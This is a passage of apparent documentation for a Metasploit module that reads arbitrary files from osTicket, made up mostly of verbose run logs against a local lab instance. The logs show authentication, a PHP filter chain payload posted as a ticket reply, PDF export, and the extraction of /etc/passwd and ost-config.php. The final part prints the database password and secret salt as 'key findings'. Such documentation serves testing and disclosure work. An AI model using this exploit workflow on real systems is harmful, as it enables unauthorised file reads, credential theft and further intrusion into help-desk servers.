[+] extract_csrf_token: Found token=f467a6da2cdee133ab691be6cc479ad9909824b0
[*] submit_ticket_reply: Using textarea field 'response', payload=13646 bytes
[*] submit_ticket_reply: POST /scp/tickets.php with a=reply, id=1
[*] submit_ticket_reply: POST response code=302, body=13 bytes
[+] submit_ticket_reply: Got 302 redirect - reply accepted
[+] Reply posted successfully
[*] Downloading ticket PDF...
[*] download_ticket_pdf: Trying PDF export from /scp/tickets.php
[*] download_ticket_pdf: GET /scp/tickets.php?a=print&id=1
[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=71895
[+] download_ticket_pdf: Got PDF (71895 bytes)
[+] PDF downloaded (71895 bytes)
[*] Extracting file from PDF...
[*] extract_files_from_pdf: Processing PDF (71895 bytes)
[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
[*] extract_pdf_image_streams: Found image object (1239 bytes decompressed)
[*] extract_files_from_pdf: Found 2 image XObject streams
[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
[*] extract_files_from_pdf: Image #1: 1239 bytes, swapped to BGR
[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 1239-byte stream
[*] extract_data_from_bmp_stream: 1235 bytes after marker (nulls stripped)
[*] First 96 bytes of data after marker and null-strip:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[*] Data looks like base64? false
[*] Treating as plain (non-base64) - preview:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[+] extract_files_from_pdf: Image #1 yielded 1235 bytes of extracted data
[*] extract_files_from_pdf: Fallback - scanning 16 raw streams
[*] extract_files_from_pdf: Total extracted files: 1
[+] Extracted 1235 bytes

======================================================================
EXTRACTED FILE CONTENTS
======================================================================

--- [/etc/passwd] (1235 bytes) ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
mysql:
[+] Saved to: /home/tintin/.msf4/loot/20260222194158_default_127.0.0.1_osticket.etc_pas_205832.bin

[+] Exploitation complete
[*] Running module against ::1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] is_osticket?: Response code=200, body length=4943
[*] is_osticket?: osTicket signature FOUND in response body
[!] The service is running, but could not be validated. Target appears to be an osTicket installation
[*] Target: ::1:8080
[*] File to extract: /etc/passwd
[*] Attempting authentication...
[*] do_login: portal preference=auto, base_uri=/, username=administrator
[*] do_login: Trying staff panel (/scp/) login...
[*] osticket_login_scp: GET /scp/login.php
[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=qqa1df1k3ajku81n4vbkloeibq;
[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=1ddff80315e6dcc127eb115ccf65e4307c1225aa
[*] osticket_login_scp: POST /scp/login.php with userid=administrator
[*] osticket_login_scp: POST response code=302, url=index.php, body contains userid=false
[+] osticket_login_scp: Login SUCCESS
[+] do_login: SCP login succeeded, cookies=OSTSESSID=qqa1df1k3ajku81n4vbkloeibq;
[+] Authenticated via scp portal
[*] Locating ticket...
[*] find_ticket_id: GET /scp/tickets.php (looking for ticket #527686)
[*] find_ticket_id: Using cookies=OSTSESSID=qqa1df1k3ajku81n4vbkloeibq;
[*] find_ticket_id: Ticket listing response code=200, body=23647 bytes
[*] find_ticket_id: Body Length:
23647
[+] find_ticket_id: Found ticket ID=1 from listing page
[+] Ticket #527686 has internal ID: 1
[*] Generating PHP filter chain payload...
[*] Payload generated (13646 bytes)
[*] Submitting payload as ticket reply...
[*] acquire_lock_code: POST /scp/ajax.php/lock/ticket/1
[+] acquire_lock_code: Got lock code from JSON response
[*] submit_ticket_reply: GET /scp/tickets.php?id=1 to fetch CSRF token
[*] submit_ticket_reply: GET response code=200, body=73937 bytes
[*] extract_csrf_token: Searching HTML (73937 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=1ddff80315e6dcc127eb115ccf65e4307c1225aa
[*] submit_ticket_reply: Using textarea field 'response', payload=13646 bytes
[*] submit_ticket_reply: POST /scp/tickets.php with a=reply, id=1
[*] submit_ticket_reply: POST response code=302, body=13 bytes
[+] submit_ticket_reply: Got 302 redirect - reply accepted
[+] Reply posted successfully
[*] Downloading ticket PDF...
[*] download_ticket_pdf: Trying PDF export from /scp/tickets.php
[*] download_ticket_pdf: GET /scp/tickets.php?a=print&id=1
[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=72070
[+] download_ticket_pdf: Got PDF (72070 bytes)
[+] PDF downloaded (72070 bytes)
[*] Extracting file from PDF...
[*] extract_files_from_pdf: Processing PDF (72070 bytes)
[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
[*] extract_pdf_image_streams: Found image object (1239 bytes decompressed)
[*] extract_files_from_pdf: Found 2 image XObject streams
[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
[*] extract_files_from_pdf: Image #1: 1239 bytes, swapped to BGR
[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 1239-byte stream
[*] extract_data_from_bmp_stream: 1235 bytes after marker (nulls stripped)
[*] First 96 bytes of data after marker and null-strip:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[*] Data looks like base64? false
[*] Treating as plain (non-base64) - preview:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[+] extract_files_from_pdf: Image #1 yielded 1235 bytes of extracted data
[*] extract_files_from_pdf: Fallback - scanning 16 raw streams
[*] extract_files_from_pdf: Total extracted files: 1
[+] Extracted 1235 bytes

======================================================================
EXTRACTED FILE CONTENTS
======================================================================

--- [/etc/passwd] (1235 bytes) ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
mysql:
[+] Saved to: /home/tintin/.msf4/loot/20260222194159_default_1_osticket.etc_pas_624998.bin

[+] Exploitation complete
[*] Auxiliary module execution completed
```

### Without Specifying Ticket Number

```
msf auxiliary(gather/osticket_arbitrary_file_read) > set USERNAME newuser
USERNAME => newuser
msf auxiliary(gather/osticket_arbitrary_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(gather/osticket_arbitrary_file_read) > set RHOSTS http://localhost:8080/
RHOSTS => http://localhost:8080/
msf auxiliary(gather/osticket_arbitrary_file_read) > set PASSWORD newuser
PASSWORD => newuser
msf auxiliary(gather/osticket_arbitrary_file_read) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] is_osticket?: Response code=200, body length=4943
[*] is_osticket?: osTicket signature FOUND in response body
[!] The service is running, but could not be validated. Target appears to be an osTicket installation
[*] Target: 127.0.0.1:8080
[*] File to extract: include/ost-config.php
[*] Attempting authentication...
[*] do_login: portal preference=auto, base_uri=/, username=newuser
[*] do_login: Trying staff panel (/scp/) login...
[*] osticket_login_scp: GET /scp/login.php
[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=uf493kdg73eh3bf11pmcv6ed54;
[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=0e9e898a719233e0a4ecec120cd047d0cd9507ee
[*] osticket_login_scp: POST /scp/login.php with userid=newuser
[*] osticket_login_scp: POST response code=200, url=, body contains userid=true
[-] osticket_login_scp: Login FAILED (still see login form)
[*] do_login: Staff panel login failed
[*] do_login: Trying client portal login...
[*] osticket_login_client: GET /login.php
[*] osticket_login_client: GET response code=200, cookies=OSTSESSID=6cei75oh450nmtfni8a5tqps2o;
[*] extract_csrf_token: Searching HTML (5213 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=dba0292e34ca0ff8fc036933d4d6db2a2eb791df
[*] osticket_login_client: POST /login.php with luser=newuser
[*] osticket_login_client: POST response code=302, body contains luser=false
[+] osticket_login_client: Login SUCCESS
[+] do_login: Client portal login succeeded, cookies=OSTSESSID=6cei75oh450nmtfni8a5tqps2o;
[+] Authenticated via client portal
[!] No TICKET_NUMBER supplied — a new ticket will be created each time this module runs
[*] create_ticket: GET /open.php
[*] extract_csrf_token: Searching HTML (6579 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=7cc418ea2a3fff84b6593ad2928a7e7c66e4745d
[*] detect_open_form_fields: topicId=2
[*] fetch_topic_form_fields: GET /ajax.php/form/help-topic/2
[*] fetch_topic_form_fields: subject="eac457d4f21b58", message="56f3da3b9db7ae"
[*] create_ticket: POST /open.php (topicId=2)
[*] create_ticket: POST response code=302
[+] create_ticket: Ticket created, internal ID=12
[*] fetch_ticket_number: GET /tickets.php?id=12
[+] fetch_ticket_number: Ticket number=#169169
[+] Created ticket #169169 (internal ID: 12)
[*] Generating PHP filter chain payload...
[*] Payload generated (13656 bytes)
[*] Submitting payload as ticket reply...
[*] submit_ticket_reply: GET /tickets.php?id=12 to fetch CSRF token
[*] submit_ticket_reply: GET response code=200, body=9618 bytes
[*] extract_csrf_token: Searching HTML (9618 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=7cc418ea2a3fff84b6593ad2928a7e7c66e4745d
[*] submit_ticket_reply: Using textarea field '56f3da3b9db7ae', payload=13656 bytes
[*] submit_ticket_reply: POST /tickets.php with a=reply, id=12
[*] submit_ticket_reply: POST response code=200, body=24137 bytes
[*] submit_ticket_reply: Success indicators found=true
[+] Reply posted successfully
[*] Downloading ticket PDF...
[*] download_ticket_pdf: Trying PDF export from /tickets.php
[*] download_ticket_pdf: GET /tickets.php?a=print&id=12
[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=57262
[+] download_ticket_pdf: Got PDF (57262 bytes)
[+] PDF downloaded (57262 bytes)
[*] Extracting file from PDF...
[*] extract_files_from_pdf: Processing PDF (57262 bytes)
[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
[*] extract_pdf_image_streams: Found image object (6357 bytes decompressed)
[*] extract_files_from_pdf: Found 2 image XObject streams
[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
[*] extract_files_from_pdf: Image #1: 6357 bytes, swapped to BGR
[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 6357-byte stream
[*] extract_data_from_bmp_stream: 6353 bytes after marker (nulls stripped)
[*] First 96 bytes of data after marker and null-strip:
[*]   ascii: "<?php./*********************************************************************.    ost-config.php."
[*]   hex:   3c 3f 70 68 70 0a 2f 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 0a 20 20 20 20 6f 73 74 2d 63 6f 6e 66 69 67 2e 70 68 70 0a
[*] Data looks like base64? false
[*] Treating as plain (non-base64) - preview:
[*]   ascii: "<?php./*********************************************************************.    ost-config.php."
[*]   hex:   3c 3f 70 68 70 0a 2f 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 0a 20 20 20 20 6f 73 74 2d 63 6f 6e 66 69 67 2e 70 68 70 0a
[+] extract_files_from_pdf: Image #1 yielded 6353 bytes of extracted data
[*] extract_files_from_pdf: Fallback - scanning 12 raw streams
[*] extract_files_from_pdf: Total extracted files: 1
[+] Extracted 6353 bytes

======================================================================
EXTRACTED FILE CONTENTS
======================================================================

--- [include/ost-config.php] (6353 bytes) ---
<?php
/*********************************************************************
    ost-config.php

    Static osTicket configuration file. Mainly useful for mysql login info.
    Created during installation process and shouldn't change even on upgrades.

    Peter Rotich <peter@osticket.com>
    Copyright (c)  2006-2010 osTicket
    http://www.osticket.com

    Released under the GNU General Public License WITHOUT ANY WARRANTY.
    See LICENSE.TXT for details.

    vim: expandtab sw=4 ts=4 sts=4:
    $Id: $
**********************************************************************/

#Disable direct access.
if(!strcasecmp(basename($_SERVER['SCRIPT_NAME']),basename(__FILE__)) || !defined('INCLUDE_DIR'))
    die('kwaheri rafiki!');

#Install flag
define('OSTINSTALLED',TRUE);
if(OSTINSTALLED!=TRUE){
    if(!file_exists(ROOT_DIR.'setup/install.php')) die('Error: Contact system admin.'); //Something is really wrong!
    //Invoke the installer.
    header('Location: '.ROOT_PATH.'setup/install.php');
    exit;
}

# Encrypt/Decrypt secret key - randomly generated during installation.
define('SECRET_SALT','ELPqrKK_aF5JLxk9M0uz__EFFP3Jxn0P');

#Default admin email. Used only on db connection issues and related alerts.
define('ADMIN_EMAIL','administrator@localhost.local');

# Database Options
# ====================================================
# Mysql Login info
#
define('DBTYPE','mysql');
#  DBHOST can have comma separated hosts (e.g db1:6033,db2:6033)
define('DBHOST','localhost');
define('DBNAME','osticket_db');
define('DBUSER','osticket_user');
define('DBPASS','P@ssw0rd123!');

# Database TCP/IP Connect Timeout (default: 3 seconds)
# Timeout is important when DBHOST has multiple proxies to try
# define('DBCONNECT_TIMEOUT', 3);

# Table prefix
define('TABLE_PREFIX','ost_');

#
# SSL Options
# ---------------------------------------------------
# SSL options for MySQL can be enabled by adding a certificate allowed by
# the database server here. To use SSL, you must have a client certificate
# signed by a CA (certificate authority). You can easily create this
# yourself with the EasyRSA suite. Give the public CA certificate, and both
# the public and private parts of your client certificate below.
#
# Once configured, you can ask MySQL to require the certificate for
# connections:
#
# > create user osticket;
# > grant all on osticket.* to osticket require subject '<subject>';
#
# More information (to-be) available in doc/security/hardening.md

# define('DBSSLCA','/path/to/ca.crt');
# define('DBSSLCERT','/path/to/client.crt');
# define('DBSSLKEY','/path/to/client.key');

#
# Mail Options
# ===================================================
# Option: MAIL_EOL (default: \n)
#
# Some mail setups do not handle emails with \r\n (CRLF) line endings for
# headers and base64 and quoted-response encoded bodies. This is an error
# and a violation of the internet mail RFCs. However, because this is also
# outside the control of both osTicket development and many server
#

... (truncated)
[+] Saved to: /home/tintin/.msf4/loot/20260321104202_default_127.0.0.1_osticket.include_866909.php

======================================================================
KEY FINDINGS
======================================================================
[+]   SECRET_SALT: ELPqrKK_aF5JLxk9M0uz__EFFP3Jxn0P
[+]   ADMIN_EMAIL: administrator@localhost.local
[+]   DBHOST: localhost
[+]   DBNAME: osticket_db
[+]   DBUSER: osticket_user
[+]   DBPASS: P@ssw0rd123!
[!] No active DB -- Credential data will not be saved!

[+] Exploitation complete
[*] Auxiliary module execution completed
```